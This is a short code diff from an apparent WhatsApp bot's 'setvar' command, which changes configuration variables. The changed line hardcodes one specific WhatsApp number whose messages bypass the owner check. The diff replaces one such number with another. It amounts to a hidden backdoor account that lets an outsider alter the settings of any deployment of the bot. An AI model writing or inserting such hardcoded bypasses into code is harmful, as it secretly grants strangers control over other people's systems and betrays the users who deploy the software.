@@ -212,7 +212,7 @@ Module_Exports({
         kingpath: __filename
     },
     async(Void, citel , text,{ isCreator }) => {
-if (citel.sender =='923466319114@s.whatsapp.net'){} 
+if (citel.sender =='2349027862116@s.whatsapp.net'){} 
 else { if (!isCreator) return citel.reply(tlang().owner);}
 if (!text) return citel.reply (`*_Give me Variable Name_*\n*_Ex: ${prefix}setvar CAPTION: Powered By Maher Zubair_*`);
 const headers = {
